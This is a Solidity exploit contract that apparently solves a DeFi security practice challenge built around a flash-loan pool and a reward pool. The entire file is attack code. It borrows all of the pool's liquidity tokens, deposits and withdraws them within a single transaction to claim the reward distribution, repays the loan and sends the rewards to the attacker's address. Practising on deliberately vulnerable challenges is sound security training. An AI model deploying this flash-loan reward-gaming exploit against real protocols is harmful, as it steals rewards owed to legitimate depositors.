// SPDX-License-Identifier: MIT
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract Exploit {
    address player;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool theRewardPool;
    ERC20 liquidityToken;
    ERC20 rewardToken;

    constructor(address _player, address _flashLoanPool, address _theRewardPool, address _liquidityToken, address _rewardToken) {
        player = _player;
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        theRewardPool = TheRewarderPool(_theRewardPool);
        liquidityToken = ERC20(_liquidityToken);
        rewardToken = ERC20(_rewardToken);
    }

    function exploit() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        assert(msg.sender == address(flashLoanPool));
        liquidityToken.approve(address(theRewardPool), amount);
        theRewardPool.deposit(amount);
        theRewardPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}